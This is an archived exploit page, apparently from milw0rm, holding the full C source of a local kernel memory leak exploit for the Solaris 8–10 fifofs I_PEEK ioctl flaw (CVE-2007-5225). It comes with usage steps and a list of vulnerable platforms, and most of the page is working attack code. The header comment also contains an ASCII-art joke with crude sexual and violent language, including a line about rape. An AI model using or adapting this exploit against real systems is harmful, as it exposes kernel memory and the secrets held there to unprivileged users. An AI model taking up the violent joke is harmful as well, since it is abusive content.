<html><head><title>Solaris 8/9/10 fifofs I_PEEK Local Kernel memory Leak Exploit</title></head><pre>/*
 * $Id: raptor_peek.c,v 1.1 2007/10/18 08:09:02 raptor Exp $
 *
 * raptor_peek.c - Solaris fifofs I_PEEK kernel memory leak
 * Copyright (c) 2007 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;
 *
 * [Lame] integer signedness error in FIFO filesystems (named pipes) on Sun 
 * Solaris 8 through 10 allows local users to read the contents of unspecified 
 * memory locations via a negative value to the I_PEEK ioctl (CVE-2007-5225).
 *
 *        /\   AS PART OF A VAST WORLD-WIDE CONSPIRACY              
 *  hjm  /  \   I COMMAND THEE:  BEAT OFF UNTO ME                   
 *      /,--.\                                                      
 *     /&lt; () &gt;\   IF I SAY &quot;FNORD&quot; AT THE END OF A SENTENCE         
 *    /  `--'  \   DOES THAT MAKE ME REALLY FUNNY OR SOMEONE        
 *   /          \   WHO NEEDS TO GET FUCKING BEATEN TO NEAR         
 *  /            \   DEATH AND THEN RAPED WITH A BROOM              
 * /______________\                                                 
 *                  AS YOU CAN SEE THAT'S REALLY TWO JOKES IN ONE
 *                   SO YOU REALLY GET YOUR MONEY'S WORTH HERE   
 * Usage:
 * $ gcc raptor_peek.c -o raptor_peek -Wall
 * $ ./raptor_peek kerndump 666666
 * [...]
 * $ ls -l kerndump 
 * -rwx------   1 raptor   staff     666666 Oct 17 19:33 kerndump
 *
 * Vulnerable platforms (SPARC):
 * Solaris 8 without patch 109454-06 [tested]
 * Solaris 9 without patch 117471-04 [tested]
 * Solaris 10 without patch 127737-01 [tested]
 *
 * Vulnerable platforms (x86):
 * Solaris 8 without patch 109455-06 [untested]
 * Solaris 9 without patch 117472-04 [untested]
 * Solaris 10 without patch 127738-01 [untested]
 */

#include &lt;errno.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;strings.h&gt;
#include &lt;stropts.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/stat.h&gt;

#define	INFO1	&quot;raptor_peek.c - Solaris fifofs I_PEEK kernel memory leak&quot;
#define	INFO2	&quot;Copyright (c) 2007 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;&quot;

#define	BADFIFO	&quot;/tmp/fnord&quot;
#define BUFSIZE 1000000

int 	errno;

int main(int argc, char **argv)
{
	int 		fd, fifo;
	size_t		out, bufsize = BUFSIZE;
	char		*buf;
	struct strpeek 	peek;

	/* print exploit information */
	fprintf(stderr, &quot;%s\n%s\n\n&quot;, INFO1, INFO2);

	/* read command line */
	if (argc &lt; 2) {
		fprintf(stderr, &quot;usage: %s outfile [outsize]\n\n&quot;, argv[0]);
		exit(1);
	}
	if (argc &gt; 2)
		if ((bufsize = atoi(argv[2])) == 0) {
			fprintf(stderr, &quot;Error (atoi): invalid outsize\n&quot;);
			exit(1);
		}

	/* print some output */
	fprintf(stderr, &quot;Using outfile\t: %s\n&quot;, argv[1]);
	fprintf(stderr, &quot;Using outsize\t: %u\n\n&quot;, bufsize);

	/* prepare the output buffer */
	if ((buf = (char *)malloc(bufsize)) == NULL) {
		perror(&quot;Error (malloc)&quot;);
		fprintf(stderr, &quot;Hint: Try again with a smaller output size\n&quot;);
		exit(1);
	}
	memset(buf, 0, bufsize);

	/* create the named pipe */
	unlink(BADFIFO);
	if (mknod(BADFIFO, S_IFIFO | S_IRWXU, 0) &lt; 0) {
		perror(&quot;Error (mknod)&quot;);
		exit(1);
	}

	switch(fork()) {
	case -1: 	/* cannot fork */
		perror(&quot;Error (fork)&quot;);
		exit(1);
	case 0: 	/* the child writes */
		if ((fifo = open(BADFIFO, O_WRONLY, 0)) &lt; 0) {
			perror(&quot;Error (open)&quot;);
			exit(1);
		}
		write(fifo, &quot;FNORD&quot;, 5);
		exit(0);
	default: 	/* the parent reads */
		/* FALL THROUGH */
		;
	}

	/* perform the MAGICK */
	if ((fifo = open(BADFIFO, O_RDONLY, 0)) &lt; 0) {
		perror(&quot;Error (open)&quot;);
		exit(1);
	}

	memset(&amp;peek, 0, sizeof(peek));
	peek.databuf.buf = buf;
	peek.databuf.maxlen = -1; /* FNORD! */

	if (ioctl(fifo, I_PEEK, &amp;peek) &lt; 0 ) {
		perror(&quot;Error (ioctl)&quot;);
		close(fifo);
		exit(1);
	}

	/* save output to outfile */
	if ((fd = open(argv[1], O_RDWR | O_CREAT | O_TRUNC, 0700)) &lt; 0) {
		perror(&quot;Error (open)&quot;);
		close(fifo);
		exit(1);
	}
	out = write(fd, buf, bufsize);

	fprintf(stderr, &quot;FNORD! %u bytes written to %s\n&quot;, out, argv[1]);
	fprintf(stderr, &quot;Hint: Try also with a bigger output size\n&quot;);

	/* cleanup (who cares about free?;) */
	close(fd);
	close(fifo);

	exit(0);
}

// milw0rm.com [2008-03-10]</pre></html>